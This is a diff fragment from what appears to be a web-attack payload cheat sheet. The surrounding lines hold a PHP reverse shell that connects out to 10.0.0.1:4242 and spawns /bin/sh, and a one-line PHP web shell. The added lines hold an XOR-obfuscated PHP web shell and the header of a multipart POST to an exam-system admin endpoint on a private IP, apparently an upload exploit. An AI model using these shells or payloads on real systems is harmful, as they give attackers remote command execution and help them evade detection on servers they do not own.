@@ -55,3 +55,11 @@ php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>
 ```
 <?php system($_GET["cmd"]);?>
 ```
+
+XOR encode
+
+```
+<?=$_='{';$_=($_^'<').($_^'>;').($_^'/');${'_'.$_}['_'](${'_'.$_}['__']);?>
+```
+
+POST /management/admin/examQuestion/create HTTP/1.1 Host: 192.168.213.13 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------183813756938980137172117669544 Content-Length: 1333 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1
